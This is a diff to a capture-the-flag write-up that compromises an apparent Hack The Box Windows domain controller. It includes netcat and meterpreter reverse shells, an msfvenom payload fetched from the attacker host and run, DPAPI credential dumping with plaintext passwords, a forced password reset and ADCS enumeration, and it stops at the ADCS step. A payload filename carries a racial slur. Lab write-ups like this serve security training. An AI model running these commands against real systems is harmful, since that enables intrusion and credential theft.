@@ -198,6 +198,7 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 322.24 seconds
 ```
+
 #### Generate Host File
 ```
 ┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
@@ -258,8 +259,499 @@ SMB         10.129.29.249   445    DC               [*] Windows 11 / Server 2025
 SMB         10.129.29.249   445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01 
 ```
 
-#### Web Enumeration
-<img width="1820" height="829" alt="image" src="https://github.com/user-attachments/assets/14325305-3e17-4b43-89c5-b465f09cd145" />
+### Foothold
+
+#### Windows Admin Center RCE
 <img width="1271" height="850" alt="image" src="https://github.com/user-attachments/assets/e5bfe800-191a-4499-9f91-a37e1a57cfbd" />
 <img width="1824" height="945" alt="image" src="https://github.com/user-attachments/assets/923baea5-adbc-4218-9b22-03a27e6a1124" />
+<img width="1203" height="524" alt="image" src="https://github.com/user-attachments/assets/cf678906-8949-44b1-88ce-6b39ac9912c4" />
+<img width="704" height="444" alt="image" src="https://github.com/user-attachments/assets/6c069bb4-c4f5-4ab8-b9d6-3c9c0524e6ec" />
+<img width="1168" height="874" alt="image" src="https://github.com/user-attachments/assets/90bc3a77-50f0-41d1-b60a-5087636d9e0b" />
+<img width="1216" height="659" alt="image" src="https://github.com/user-attachments/assets/a45ce4bb-db56-4970-8fbb-d1b8df167599" />
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ nc -lvnp 1337                                                                                       
+listening on [any] 1337 ...
+connect to [10.10.14.183] from (UNKNOWN) [10.129.10.114] 62927
+
+PS C:\WINDOWS\system32> whoami
+danglingtree\anderson.w
+```
+
+### Lateral Movement
+
+#### Local Open Port Enumeration
+```
+PS C:\Windows\System32>netstat -ano | findstr LISTENING
+netstat -ano | findstr LISTENING
+ ...
+  TCP    0.0.0.0:17017          0.0.0.0:0              LISTENING       2756
+ ...
+```
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ python3 -m http.server 8888                   
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+10.129.10.114 - - [17/Aug/2026 21:49:59] "GET /agent.exe HTTP/1.1" 200 -
+```
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ sudo ligolo-proxy -selfcert
+[sudo] password for blackcat: 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+INFO[0000] Listening on 0.0.0.0:11601                   
+INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8081 
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: dev
+
+ligolo-ng » WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
+INFO[1169] Agent joined. id=0050569574da name="DANGLINGTREE\\anderson.w@dc" remote="10.129.10.114:62935"
+INFO[1187] Starting tunnel to DANGLINGTREE\anderson.w@dc (0050569574da)
+```
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb/ligolo-ng-web]
+└─$ npm run dev                                                                       
+
+> ligolo-ng-web@0.0.0 dev
+> vite
+
+  VITE v5.4.14  ready in 1062 ms
+
+  ➜  Local:   http://localhost:5173/
+  ➜  Network: use --host to expose
+  ➜  press h + enter to show help
+
+```
+
+```
+PS C:\Users\anderson.w\Documents> Invoke-WebRequest http://10.10.14.183:8888/agent.exe -UseBasicParsing -OutFile agent.exe
+PS C:\Users\anderson.w\Documents> .\agent.exe -connect 10.10.14.183:11601 -ignore-cert
+```
+
+<img width="531" height="255" alt="image" src="https://github.com/user-attachments/assets/1ce1af3c-b086-4689-8536-f1fa83789bc1" />
+<img width="804" height="468" alt="image" src="https://github.com/user-attachments/assets/1f033e4a-aac3-4f73-8e7b-a8bab270a7c7" />
+
+#### Smartermail Auth Bypass via Password Reset + RCE
+<img width="1822" height="899" alt="image" src="https://github.com/user-attachments/assets/98eb6cc9-0398-4b4b-a524-4fe6f5d67078" />
+https://labs.watchtowr.com/attackers-with-decompilers-strike-again-smartertools-smartermail-wt-2026-0001-auth-bypass/
+
+```
+PS C:\Users\anderson.w\Documents> ls -force /Users 
+    Directory: C:\Users
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         3/25/2026  10:40 PM                .NET v4.5                                                            
+d-----         3/25/2026  10:40 PM                .NET v4.5 Classic                                                    
+d-----         3/25/2026  10:19 PM                Administrator                                                        
+d--hsl          4/1/2024  12:26 AM                All Users                                                            
+d-----         8/16/2026   2:51 PM                anderson.w                                                           
+d-rh--         3/25/2026  10:16 PM                Default                                                              
+d--hsl          4/1/2024  12:26 AM                Default User                                                         
+d-----         3/26/2026   2:23 PM                noah.b                                                               
+d-r---         8/16/2026   5:25 PM                Public                                                               
+d-----         3/27/2026   5:53 PM                svc_mail                                                             
+-a-hs-          4/1/2024  12:01 AM            174 desktop.ini 
+```
+
+<img width="982" height="815" alt="image" src="https://github.com/user-attachments/assets/230add9d-e470-4af0-a6cb-ebde7a702ab8" />
+<img width="1213" height="658" alt="image" src="https://github.com/user-attachments/assets/c2aa5858-0042-43bf-9f02-c16f2626428c" />
+
+<img width="1828" height="892" alt="image" src="https://github.com/user-attachments/assets/c6e0163a-496c-48ee-9bba-b1ccb07a5608" />
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ penelope -p 1338
+[+] Listening for reverse shells on 0.0.0.0:1338 →  127.0.0.1 • 192.168.100.24 • 192.168.100.112 • 172.17.0.1 • 10.10.14.183
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from DC~10.129.10.114-Microsoft_Windows_Server_2025_Standard-x64-based_PC 😍️ Assigned SessionID <1>
+[+] Added readline support...
+[+] Interacting with session [1], Shell Type: Basic, Menu key: Ctrl-D 
+[+] Logging to /home/blackcat/.penelope/DC~10.129.10.114-Microsoft_Windows_Server_2025_Standard-x64-based_PC/2026_08_18-08_42_07-956.log 📜
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+PS C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings> whoami
+danglingtree\svc_mail
+```
+
+#### SmarterMail User (noah.b) Password Decryption from Backup Folder
+
+C:\SmarterMail\Domains\danglingtree.htb\Users\noah.b\settings.json
+<img width="1817" height="747" alt="image" src="https://github.com/user-attachments/assets/f5573733-cb3b-4c06-9774-e19e246d7a04" />
+<img width="576" height="567" alt="image" src="https://github.com/user-attachments/assets/651403e7-bea8-41e8-bb36-8022e8e791ff" />
+<img width="1781" height="908" alt="image" src="https://github.com/user-attachments/assets/0f024571-53e5-4bec-a29f-86545f49ed6b" />
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ nxc smb 10.129.10.114 -u 'noah.b' -p 'RiverDragon#Storm25'        
+SMB         10.129.10.114   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.10.114   445    DC               [+] danglingtree.htb\noah.b:RiverDragon#Storm25
+```
+
+### User Shell (noah.b) + User Flag
+
+```
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
+payload => windows/x64/meterpreter_reverse_tcp
+msf exploit(multi/handler) > set lhost 10.10.14.183
+lhost => 10.10.14.183
+msf exploit(multi/handler) > set lport 6666
+lport => 6666
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.14.183:6666 
+
+```
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.183 LPORT=6666 -f exe -o niggasuu.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 248902 bytes
+Final size of exe file: 256000 bytes
+Saved as: niggasuu.exe
+```
+
+https://github.com/jakobfriedl/precompiled-binaries
+<img width="1821" height="891" alt="image" src="https://github.com/user-attachments/assets/3df9ffd9-732a-4dd6-82b6-b08c3fe7fd1e" />
+
+```
+PS C:\Users\Public> Invoke-WebRequest http://10.10.14.183:8888/niggasuu.exe -UseBasicParsing -OutFile niggasuu.exe
+PS C:\Users\Public> Invoke-WebRequest http://10.10.14.183:8888/runascs.exe -UseBasicParsing -OutFile runascs.exe
+PS C:\Users\Public> .\runascs.exe noah.b "RiverDragon#Storm25" ".\niggasuu.exe"
+[*] Warning: The logon for user 'noah.b' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+```
+
+```
+[*] Meterpreter session 1 opened (10.10.14.183:6666 -> 10.129.10.114:63180) at 2026-08-17 22:08:53 +0700
+
+meterpreter > shell
+Process 468 created.
+Channel 3 created.
+Microsoft Windows [Version 10.0.26100.33158]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\System32>whoami
+whoami
+danglingtree\noah.b
+C:\Windows\System32> type /Users/noah.b/Desktop/user.txt
+type /Users/noah.b/Desktop/user.txt
+{ User Flag Pwned! }
+```
+
+### Privesc to Administrator
+
+#### Windows Credential Manager (alex.o creds)
+
+https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
+<img width="1817" height="886" alt="image" src="https://github.com/user-attachments/assets/70166419-4226-4f8e-8c05-69a18af66473" />
+
+```
+C:\Windows\System32>cmdkey /list
+cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:target=PC01.danglingtree.htb
+    Type: Domain Password
+    User: alex.o
+    
+    Target: Domain:interactive=danglingtree\alex.o
+    Type: Domain Password
+    User: danglingtree\alex.o
+```
+```
+C:\Windows\System32>runas /user:danglingtree\alex.o /savecred cmd.exe
+runas /user:danglingtree\alex.o /savecred cmd.exe
+Enter the password for danglingtree\alex.o: 
+
+```
+
+https://www.thehacker.recipes/ad/movement/credentials/dumping/windows-credential-manager
+<img width="1821" height="895" alt="image" src="https://github.com/user-attachments/assets/90326b90-193c-4f81-a765-2b2af6d8305e" />
+
+```
+PS C:\ProgramData\Microsoft\Vault> vaultcmd /list
+Currently loaded vaults:
+	Vault: Web Credentials
+	Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+	Location: C:\Users\noah.b\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+	Vault: Windows Credentials
+	Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
+	Location: C:\Users\noah.b\AppData\Local\Microsoft\Vault
+
+PS C:\ProgramData\Microsoft\Vault> VaultCmd /listproperties:"Web Credentials"
+Vault Properties: Web Credentials
+Location: C:\Users\noah.b\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+Number of credentials: 0
+Current protection method: DPAPI
+
+PS C:\ProgramData\Microsoft\Vault> VaultCmd /listproperties:"Windows Credentials"
+Vault Properties: Windows Credentials
+Location: C:\Users\noah.b\AppData\Local\Microsoft\Vault
+Number of credentials: 2
+Current protection method: DPAPI
+
+PS C:\ProgramData\Microsoft\Vault> cd \Users\noah.b\AppData\Local\Microsoft\Vault
+PS C:\Users\noah.b\AppData\Local\Microsoft\Vault> ls
+
+    Directory: C:\Users\noah.b\AppData\Local\Microsoft\Vault
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         3/26/2026   2:24 PM                4BF4C442-9B8A-41A0-B380-DD4A704DDB28                                 
+
+PS C:\Users\public> VaultCmd /listcreds:"Windows Credentials"
+Credentials in vault: Windows Credentials
+
+Credential schema: Windows Domain Password Credential
+Resource: Domain:target=PC01.danglingtree.htb
+Identity: alex.o
+Hidden: No
+Roaming: No
+Property (schema element id,value): (100,3)
+
+Credential schema: Windows Domain Password Credential
+Resource: Domain:interactive=danglingtree\alex.o
+Identity: danglingtree\alex.o
+Hidden: No
+Roaming: No
+Property (schema element id,value): (100,3)
+
+```
+
+```
+PS C:\Users\Public> Invoke-WebRequest http://10.10.14.183:8888/sharphound.exe -UseBasicParsing -OutFile sharphound.exe
+PS C:\Users\Public> .\SharpDPAPI.exe vaults
+  __                 _   _       _ ___ 
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |  
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
+                |                      
+  v1.11.3                               
+
+[*] Action: User DPAPI Vault Triage
+[*] Triaging Vaults for the current user
+[*] Triaging Vault folder: C:\Users\noah.b\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+  Name               : Web Credentials
+    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
+    size             : 324
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : 
+    [X] MasterKey GUID not in cache: {f53fcaba-f057-48e8-8f92-0180d274bf0f}
+
+SharpDPAPI completed in 00:00:00.0449771
+PS C:\Users\Public> SharpDPAPI.exe credentials
+PS C:\Users\Public>
+(nothing ??)
+
+PS C:\Users\Public> SharpDPAPI.exe vaults /password:"RiverDragon#Storm25"
+PS C:\Users\Public> .\SharpDPAPI.exe credentials
+  __                 _   _       _ ___ 
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |  
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
+                |                      
+  v1.11.3                               
+
+[*] Action: User DPAPI Credential Triage
+[*] Triaging Credentials for current user
+
+Folder       : C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\
+  CredFile           : 57FFB67D684C67F09E7153B9C7CC3940
+    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
+    size             : 490
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Enterprise Credential Data
+    [X] MasterKey GUID not in cache: {f53fcaba-f057-48e8-8f92-0180d274bf0f}
+
+  CredFile           : 669577566E0F86A3BB614E0B17AFF1B2
+    guidMasterKey    : {f377b93a-115f-4f68-991b-1813a39bfc25}
+    size             : 474
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Enterprise Credential Data
+    [X] MasterKey GUID not in cache: {f377b93a-115f-4f68-991b-1813a39bfc25}
+
+SharpDPAPI completed in 00:00:00.0117994
+
+PS C:\Users\Public> .\SharpDPAPI.exe vaults /password:"RiverDragon#Storm25"
+  __                 _   _       _ ___ 
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |  
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
+                |                      
+  v1.11.3                               
+
+[*] Action: User DPAPI Vault Triage
+[*] Will decrypt user masterkeys with password: RiverDragon#Storm25
+[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f377b93a-115f-4f68-991b-1813a39bfc25
+[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f
+[*] Preferred master keys:
+C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602:f377b93a-115f-4f68-991b-1813a39bfc25
+
+[*] User master key cache:
+{f377b93a-115f-4f68-991b-1813a39bfc25}:DC35C8C37451F9507FE7F6D6AA750F526D7F90BF
+{f53fcaba-f057-48e8-8f92-0180d274bf0f}:9979EAB03C0DF45C93ED2D50DB01EC6A6835B818
+
+[*] Triaging Vaults for the current user
+[*] Triaging Vault folder: C:\Users\noah.b\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+  Name               : Web Credentials
+    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
+    size             : 324
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : 
+    aes128 key       : 469780F62BBDA21BBE780EDEDB7B84CE
+    aes256 key       : 46A2C74F9D09C172A8583952845B1FD888E32C4A267D4642217EB804FB299EA7
+
+SharpDPAPI completed in 00:00:00.1544137
+
+PS C:\Users\Public> .\SharpDPAPI.exe credentials /password:"RiverDragon#Storm25"
+  __                 _   _       _ ___ 
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |  
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
+                |                      
+  v1.11.3                               
+
+[*] Action: User DPAPI Credential Triage
+[*] Will decrypt user masterkeys with password: RiverDragon#Storm25
+[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f377b93a-115f-4f68-991b-1813a39bfc25
+[*] Found MasterKey : C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f
+[*] Preferred master keys:
+C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602:f377b93a-115f-4f68-991b-1813a39bfc25
+
+[*] User master key cache:
+{f377b93a-115f-4f68-991b-1813a39bfc25}:DC35C8C37451F9507FE7F6D6AA750F526D7F90BF
+{f53fcaba-f057-48e8-8f92-0180d274bf0f}:9979EAB03C0DF45C93ED2D50DB01EC6A6835B818
+
+[*] Triaging Credentials for current user
+
+Folder       : C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\
+  CredFile           : 57FFB67D684C67F09E7153B9C7CC3940
+    guidMasterKey    : {f53fcaba-f057-48e8-8f92-0180d274bf0f}
+    size             : 490
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Enterprise Credential Data
+    LastWritten      : 3/27/2026 3:03:38 PM
+    TargetName       : Domain:target=PC01.danglingtree.htb
+    TargetAlias      : 
+    Comment          : 
+    UserName         : alex.o
+    Credential       : SunsetMountainPeak@2025
+
+  CredFile           : 669577566E0F86A3BB614E0B17AFF1B2
+    guidMasterKey    : {f377b93a-115f-4f68-991b-1813a39bfc25}
+    size             : 474
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Enterprise Credential Data
+    LastWritten      : 8/16/2026 6:11:26 PM
+    TargetName       : Domain:interactive=danglingtree\alex.o
+    TargetAlias      : 
+    Comment          : 
+    UserName         : danglingtree\alex.o
+    Credential       : 
+
+SharpDPAPI completed in 00:00:00.1969564
+```
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ nxc smb 10.129.10.114 -u 'alex.o' -p 'SunsetMountainPeak@2025'        
+SMB         10.129.10.114   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.10.114   445    DC               [+] danglingtree.htb\alex.o:SunsetMountainPeak@2025 
+```
+
+cant get shell as alex.o
+
+#### alex.o to jake.h (ForceChangePassword)
+
+```
+PS C:\Users\noah.b\Documents> Invoke-WebRequest http://10.10.14.183:8888/sharphound.exe -UseBasicParsing -OutFile sharphound.exe
+PS C:\Users\noah.b\Documents> .\sharphound.exe
+2026-08-17T00:59:53.6026049-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2026-08-17T00:59:53.6263181-07:00|INFORMATION|SharpHound Version: 2.9.0.0
+2026-08-17T00:59:53.6263181-07:00|INFORMATION|SharpHound Common Version: 4.5.2.0
+2026-08-17T00:59:53.7253200-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
+2026-08-17T00:59:53.7553710-07:00|INFORMATION|Initializing SharpHound at 12:59 AM on 8/17/2026
+2026-08-17T00:59:53.8123219-07:00|INFORMATION|Resolved current domain to danglingtree.htb
+2026-08-17T00:59:53.9977529-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
+2026-08-17T00:59:54.0892261-07:00|INFORMATION|Beginning LDAP search for danglingtree.htb
+...
+...
+2026-08-17T01:00:02.8637409-07:00|INFORMATION|SharpHound Enumeration Completed at 1:00 AM on 8/17/2026! Happy Graphing!
+```
+
+<img width="1824" height="894" alt="image" src="https://github.com/user-attachments/assets/ef29e8a1-2dc9-4664-a2ee-0494c9158182" />
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ net rpc password "jake.h" "newP@ssword2022" -U "danglingtree.htb"/"alex.o"%"SunsetMountainPeak@2025" -S "dc.danglingtree.htb"
+         
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ nxc smb 10.129.10.114 -u 'jake.h' -p 'newP@ssword2022'                              
+SMB         10.129.10.114   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.10.114   445    DC               [+] danglingtree.htb\jake.h:newP@ssword2022
+```
+
+<img width="1536" height="864" alt="image" src="https://github.com/user-attachments/assets/60756e4e-c5c8-4246-8fcb-a8237f68cbfa" />
+<img width="1212" height="659" alt="image" src="https://github.com/user-attachments/assets/70c0eae0-7ec9-4bc9-a6d5-84099c4c9ae4" />
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ nc -lvnp 9999                                                  
+listening on [any] 9999 ...
+connect to [10.10.14.183] from (UNKNOWN) [10.129.10.114] 51044
+
+PS C:\Users\jake.h\Documents> whoami
+danglingtree\jake.h
+```
+
+### ADCS To Administrator + root flag
+
+```
+┌──(blackcat㉿threatactor)-[~/Desktop/danglingtree-htb]
+└─$ certipy-ad find -u 'jake.h@danglingtree.htb' -p 'newP@ssword2022' -dc-ip 10.129.10.114 -vulnerable
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 16 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
+[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
+[*] Saving text output to '20260818090527_Certipy.txt'
+[*] Wrote text output to '20260818090527_Certipy.txt'
+[*] Saving JSON output to '20260818090527_Certipy.json'
+[*] Wrote JSON output to '20260818090527_Certipy.json'
+```
+
+<img width="1782" height="931" alt="image" src="https://github.com/user-attachments/assets/b6c4fec0-370b-400c-8b8f-ab786273927c" />
+<img width="1025" height="686" alt="image" src="https://github.com/user-attachments/assets/0574789b-5bcb-4e93-ba47-f45fa93b494a" />
 
